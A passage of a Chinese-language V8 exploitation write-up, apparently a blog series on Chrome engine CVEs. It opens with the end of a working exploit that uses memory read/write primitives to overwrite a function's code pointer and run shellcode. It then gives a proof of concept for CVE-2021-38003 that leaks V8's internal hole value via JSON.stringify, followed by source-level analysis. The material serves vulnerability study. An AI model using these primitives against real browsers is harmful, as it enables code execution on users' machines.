class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code_offset = <span class="title function_">read</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] code offset: &quot;</span> + <span class="title function_">hex</span>(code_offset));</span><br><span class="line"></span><br><span class="line">code_offset += <span class="number">0x68n</span>;</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>, code_offset);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h2 id="CVE-2021-38003"><a href="#CVE-2021-38003" class="headerlink" title="CVE-2021-38003"></a>CVE-2021-38003</h2><p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/CVE-2021-38003" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> commit:<code>4a03d61accede9dd0e3e6dc0456ff5a0e3f792b4</code><br>该漏洞是 <code>JSON.stringify()</code> 中存在触发溢出异常时没有设置 <code>pending_exception</code> 导致用户代码在 catch 异常时从 <code>pending_exception</code> 中取出默认填充值 <code>Hole</code> 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title class_">Isolate</span>::<span class="title function_">clear_pending_exception</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">DCHECK</span>(!thread_local_top_.<span class="property">pending_exception_</span>-&gt;<span class="title class_">IsException</span>(<span class="variable language_">this</span>));</span><br><span class="line">  thread_local_top_.<span class="property">pending_exception_</span> = <span class="title class_">ReadOnlyRoots</span>(<span class="variable language_">this</span>).<span class="title function_">the_hole_value</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>JSON.stringify()</code> 方法是将一个 JavaScript 对象或值转换为 JSON 字符串，如果指定了一个 replacer 函数，则可以选择性地替换值，或者指定的 replacer 是数组，则可选择性地仅包含数组指定的属性。</p>
<p>该函数定义为 <code>JSON.stringify(value[, replacer [, space]])</code></p>
<ul>
<li><p><code>value</code><br>将要序列化成 一个 JSON 字符串的值。</p>
</li>
<li><p><code>replacer</code> （可选）<br>如果该参数是一个函数，则在序列化过程中，被序列化的值的每个属性都会经过该函数的转换和处理；如果该参数是一个数组，则只有包含在这个数组中的属性名才会被序列化到最终的 JSON 字符串中；如果该参数为 null 或者未提供，则对象所有的属性都会被序列化。</p>
</li>
<li><p><code>space</code> （可选）<br>指定缩进用的空白字符串，用于美化输出（pretty-print）；如果参数是个数字，它代表有多少的空格；上限为 10。该值若小于 1，则意味着没有空格；如果该参数为字符串（当字符串长度超过 10 个字母，取其前 10 个字母），该字符串将被作为空格；如果该参数没有提供（或者为 null），将没有空格。</p>
</li>
</ul>
<p>该函数返回值一个表示给定值的 JSON 字符串。</p>
<p>CVE-2021-38003 的 POC 如下，按照 POC 中调用 <code>JSON.stringify</code> 后的执行情况介绍 <code>JSON.stringify</code> 函数的具体流程。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [], b = [];</span><br><span class="line">    <span class="keyword">let</span> s = <span class="string">&#x27;&quot;&#x27;</span>.<span class="title function_">repeat</span>(<span class="number">0x800000</span>);</span><br><span class="line">    a[<span class="number">20000</span>] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) a[i] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) b[i] = a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(b);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (hole) &#123;</span><br><span class="line">        <span class="keyword">return</span> hole;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;could not trigger&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hole);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(hole);</span><br></pre></td></tr></table></figure></div>

<p><code>JSON.stringify()</code> 在 V8 中的接口如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MaybeHandle&lt;Object&gt; <span class="title">JsonStringifier::Stringify</span><span class="params">(Handle&lt;Object&gt; object,</span></span></span><br><span class="line"><span class="params"><span class="function">                                               Handle&lt;Object&gt; replacer,</span></span></span><br><span class="line"><span class="params"><span class="function">                                               Handle&lt;Object&gt; gap)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">InitializeReplacer</span>(replacer)) <span class="keyword">return</span> <span class="built_in">MaybeHandle</span>&lt;Object&gt;();</span><br><span class="line">  <span class="keyword">if</span> (!gap-&gt;<span class="built_in">IsUndefined</span>(isolate_) &amp;&amp; !<span class="built_in">InitializeGap</span>(gap)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">MaybeHandle</span>&lt;Object&gt;();</span><br><span class="line">  &#125;</span><br><span class="line">  Result result = <span class="built_in">SerializeObject</span>(object);</span><br><span class="line">  <span class="keyword">if</span> (result == UNCHANGED) <span class="keyword">return</span> <span class="built_in">factory</span>()-&gt;<span class="built_in">undefined_value</span>();</span><br><span class="line">  <span class="keyword">if</span> (result == SUCCESS) <span class="keyword">return</span> builder_.<span class="built_in">Finish</span>();</span><br><span class="line">  <span class="built_in">DCHECK</span>(result == EXCEPTION);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">MaybeHandle</span>&lt;Object&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到 <code>Stringify</code> 在初始化完 <code>replacer</code> 和 <code>gap</code> 之后会调用核心函数 <code>SerializeObject</code> 之后对返回值进行检查，如果返回值为 <code>EXCEPTION</code> 说明触发异常。</p>
<p><code>SerializeObject</code> 函数实际是调用 <code>Serialize_</code> 函数。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Entry point to serialize the object.</span></span><br><span class="line"><span class="function">V8_INLINE Result <span class="title">SerializeObject</span><span class="params">(Handle&lt;Object&gt; obj)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Serialize_</span>&lt;<span class="literal">false</span>&gt;(obj, <span class="literal">false</span>, <span class="built_in">factory</span>()-&gt;<span class="built_in">empty_string</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Serialize_</code> 函数中是一个很大的 switch ，对于 <code>obj</code> 中的元素的类型调用不同的序列化方法。根据 POC 的情况，这里调用 <code>SerializeJSArray</code> 函数。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="type">bool</span> deferred_string_key&gt;</span><br><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::Serialize_</span><span class="params">(Handle&lt;Object&gt; object,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                    <span class="type">bool</span> comma,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                    Handle&lt;Object&gt; key)</span> </span>&#123; </span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">switch</span> (HeapObject::<span class="built_in">cast</span>(*object).<span class="built_in">map</span>().<span class="built_in">instance_type</span>()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> JS_ARRAY_TYPE:</span><br><span class="line">      <span class="keyword">if</span> (deferred_string_key) <span class="built_in">SerializeDeferredKey</span>(comma, key);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">SerializeJSArray</span>(Handle&lt;JSArray&gt;::<span class="built_in">cast</span>(object), key);</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>SerializeJSArray</code> 函数的相关内容如下。在 POC 中数组 <code>b</code> 的每个元素均是数组 <code>a</code>，其类型是 <code>PACKED_ELEMENTS</code> 因此会调用 <code>SerializeElement</code> 处理，而 <code>SerializeElement</code> 会调用 <code>Serialize_</code> 递归进行处理。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// Serialize an array element.</span></span><br><span class="line">  <span class="comment">// The index may serve as argument for the toJSON function.</span></span><br><span class="line">  <span class="function">V8_INLINE Result <span class="title">SerializeElement</span><span class="params">(Isolate* isolate, Handle&lt;Object&gt; object,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Serialize_</span>&lt;<span class="literal">false</span>&gt;(object, <span class="literal">false</span>,</span><br><span class="line">                             <span class="built_in">Handle</span>&lt;Object&gt;(Smi::<span class="built_in">FromInt</span>(i), isolate));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::SerializeJSArray</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Handle&lt;JSArray&gt; object, Handle&lt;Object&gt; key)</span> </span>&#123;</span><br><span class="line">  <span class="function">HandleScope <span class="title">handle_scope</span><span class="params">(isolate_)</span></span>;</span><br><span class="line">  Result stack_push = <span class="built_in">StackPush</span>(object, key);</span><br><span class="line">  <span class="keyword">if</span> (stack_push != SUCCESS) <span class="keyword">return</span> stack_push;</span><br><span class="line">  <span class="type">uint32_t</span> length = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">CHECK</span>(object-&gt;<span class="built_in">length</span>().<span class="built_in">ToArrayLength</span>(&amp;length));</span><br><span class="line">  <span class="built_in">DCHECK</span>(!object-&gt;<span class="built_in">IsAccessCheckNeeded</span>());</span><br><span class="line">  builder_.<span class="built_in">AppendCharacter</span>(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">  <span class="built_in">Indent</span>();</span><br><span class="line">  <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (replacer_function_.<span class="built_in">is_null</span>()) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (object-&gt;<span class="built_in">GetElementsKind</span>()) &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">case</span> PACKED_ELEMENTS: &#123;</span><br><span class="line">        <span class="function">Handle&lt;Object&gt; <span class="title">old_length</span><span class="params">(object-&gt;length(), isolate_)</span></span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">          <span class="keyword">if</span> (object-&gt;<span class="built_in">length</span>() != *old_length ||</span><br><span class="line">              object-&gt;<span class="built_in">GetElementsKind</span>() != PACKED_ELEMENTS) &#123;</span><br><span class="line">            <span class="comment">// Fall back to slow path.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">Separator</span>(i == <span class="number">0</span>);</span><br><span class="line">          Result result = <span class="built_in">SerializeElement</span>(</span><br><span class="line">              isolate_,</span><br><span class="line">              <span class="built_in">Handle</span>&lt;Object&gt;(FixedArray::<span class="built_in">cast</span>(object-&gt;<span class="built_in">elements</span>()).<span class="built_in">get</span>(i),</span><br><span class="line">                             isolate_),</span><br><span class="line">              i);</span><br><span class="line">          <span class="keyword">if</span> (result == UNCHANGED) &#123;</span><br><span class="line">            builder_.<span class="built_in">AppendCString</span>(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (result != SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">          &#125;</span><br><span class="line">          i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// The FAST_HOLEY_* cases could be handled in a faster way. They resemble</span></span><br><span class="line">      <span class="comment">// the non-holey cases except that a lookup is necessary for holes.</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (i &lt; length) &#123;</span><br><span class="line">    <span class="comment">// Slow path for non-fast elements and fall-back in edge case.</span></span><br><span class="line">    Result result = <span class="built_in">SerializeArrayLikeSlow</span>(object, i, length);</span><br><span class="line">    <span class="keyword">if</span> (result != SUCCESS) <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Unindent</span>();</span><br><span class="line">  <span class="keyword">if</span> (length &gt; <span class="number">0</span>) <span class="built_in">NewLine</span>();</span><br><span class="line">  builder_.<span class="built_in">AppendCharacter</span>(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">  <span class="built_in">StackPop</span>();</span><br><span class="line">  <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>数组 a 的成元是基本类型字符串，所以在 <code>SerializeJSArray</code> 方法不会再进入递归，而是调用 <code>SerializeArrayLikeSlow</code> 进行下一步操作</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::SerializeArrayLikeSlow</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Handle&lt;JSReceiver&gt; object, <span class="type">uint32_t</span> start, <span class="type">uint32_t</span> length)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// We need to write out at least two characters per array element.</span></span><br><span class="line">  <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kMaxSerializableArrayLength = String::kMaxLength / <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (length &gt; kMaxSerializableArrayLength) &#123;</span><br><span class="line">    isolate_-&gt;<span class="built_in">Throw</span>(*isolate_-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewInvalidStringLengthError</span>());</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">uint32_t</span> i = start; i &lt; length; i++) &#123;</span><br><span class="line">    <span class="built_in">Separator</span>(i == <span class="number">0</span>);</span><br><span class="line">    Handle&lt;Object&gt; element;</span><br><span class="line">    <span class="built_in">ASSIGN_RETURN_ON_EXCEPTION_VALUE</span>(</span><br><span class="line">        isolate_, element, JSReceiver::<span class="built_in">GetElement</span>(isolate_, object, i),</span><br><span class="line">        EXCEPTION);</span><br><span class="line">    Result result = <span class="built_in">SerializeElement</span>(isolate_, element, i);</span><br><span class="line">    <span class="keyword">if</span> (result == SUCCESS) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (result == UNCHANGED) &#123;</span><br><span class="line">      <span class="comment">// Detect overflow sooner for large sparse arrays.</span></span><br><span class="line">      <span class="keyword">if</span> (builder_.<span class="built_in">HasOverflowed</span>()) <span class="keyword">return</span> EXCEPTION;</span><br><span class="line">      builder_.<span class="built_in">AppendCString</span>(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里调用的 <code>SerializeElement</code> 会再次调用 <code>Serialize_</code> 只不过由于这次传入的是字符串，因此会调用 <code>SerializeString</code> 并最终调用 <code>SerializeString_</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">JsonStringifier::SerializeString</span><span class="params">(Handle&lt;String&gt; object)</span> </span>&#123;</span><br><span class="line">  object = String::<span class="built_in">Flatten</span>(isolate_, object);</span><br><span class="line">  <span class="keyword">if</span> (builder_.<span class="built_in">CurrentEncoding</span>() == String::ONE_BYTE_ENCODING) &#123;</span><br><span class="line">    <span class="keyword">if</span> (String::<span class="built_in">IsOneByteRepresentationUnderneath</span>(*object)) &#123;</span><br><span class="line">      <span class="built_in">SerializeString_</span>&lt;<span class="type">uint8_t</span>, <span class="type">uint8_t</span>&gt;(object);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      builder_.<span class="built_in">ChangeEncoding</span>();</span><br><span class="line">      <span class="built_in">SerializeString</span>(object);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (String::<span class="built_in">IsOneByteRepresentationUnderneath</span>(*object)) &#123;</span><br><span class="line">      <span class="built_in">SerializeString_</span>&lt;<span class="type">uint8_t</span>, base::uc16&gt;(object);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">SerializeString_</span>&lt;base::uc16, base::uc16&gt;(object);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">if</span> (object-&gt;<span class="built_in">IsString</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (deferred_string_key) <span class="built_in">SerializeDeferredKey</span>(comma, key);</span><br><span class="line">        <span class="built_in">SerializeString</span>(Handle&lt;String&gt;::<span class="built_in">cast</span>(object));</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>

<p><code>SerializeString_</code> 本质就是把字符 <code>Append</code> 到 <code>builder_</code> 中。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> SrcChar, <span class="keyword">typename</span> DestChar&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">JsonStringifier::SerializeString_</span><span class="params">(Handle&lt;String&gt; string)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; reader.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">      SrcChar c = reader.<span class="built_in">Get</span>&lt;SrcChar&gt;(i);</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">DoNotEscape</span>(c)) &#123;</span><br><span class="line">        builder_.<span class="built_in">Append</span>&lt;SrcChar, DestChar&gt;(c);</span><br><span class="line">      &#125; </span><br><span class="line">    ...</span><br><span class="line">  builder_.<span class="built_in">Append</span>&lt;<span class="type">uint8_t</span>, DestChar&gt;(<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过分析源码发现，整个序列化过程中一直利用 <code>builder_</code> 作为结果的存储容器，而这个容器最核心的功能就是 <code>Append</code> 。</p>
<p>在 <code>Append</code> 时如果长度达到 <code>part_length_</code> 则会调用 <code>Extend</code> 扩展容器长度。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> SrcChar, <span class="keyword">typename</span> DestChar&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IncrementalStringBuilder::Append</span><span class="params">(SrcChar c)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(encoding_ == String::ONE_BYTE_ENCODING, <span class="built_in">sizeof</span>(DestChar) == <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">sizeof</span>(DestChar) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">DCHECK_EQ</span>(String::ONE_BYTE_ENCODING, encoding_);</span><br><span class="line">    SeqOneByteString::<span class="built_in">cast</span>(*current_part_)</span><br><span class="line">        .<span class="built_in">SeqOneByteStringSet</span>(current_index_++, c);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">DCHECK_EQ</span>(String::TWO_BYTE_ENCODING, encoding_);</span><br><span class="line">    SeqTwoByteString::<span class="built_in">cast</span>(*current_part_)</span><br><span class="line">        .<span class="built_in">SeqTwoByteStringSet</span>(current_index_++, c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (current_index_ == part_length_) <span class="built_in">Extend</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而在 <code>Extend</code> 中会调用 <code>Accumulate</code> 检查扩展后的长度是否超过 <code>kMaxLength</code> 即 0x1fffffe8 ，如果超过会设置 <code>overflowed_</code> 为 true 标记溢出。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IncrementalStringBuilder::Accumulate</span><span class="params">(Handle&lt;String&gt; new_part)</span> </span>&#123;</span><br><span class="line">  Handle&lt;String&gt; new_accumulator;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">accumulator</span>()-&gt;<span class="built_in">length</span>() + new_part-&gt;<span class="built_in">length</span>() &gt; String::kMaxLength) &#123;</span><br><span class="line">    <span class="comment">// Set the flag and carry on. Delay throwing the exception till the end.</span></span><br><span class="line">    new_accumulator = <span class="built_in">factory</span>()-&gt;<span class="built_in">empty_string</span>();</span><br><span class="line">    overflowed_ = <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    new_accumulator =</span><br><span class="line">        <span class="built_in">factory</span>()-&gt;<span class="built_in">NewConsString</span>(<span class="built_in">accumulator</span>(), new_part).<span class="built_in">ToHandleChecked</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">set_accumulator</span>(new_accumulator);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IncrementalStringBuilder::Extend</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(current_index_, <span class="built_in">current_part</span>()-&gt;<span class="built_in">length</span>());</span><br><span class="line">  <span class="built_in">Accumulate</span>(<span class="built_in">current_part</span>());</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

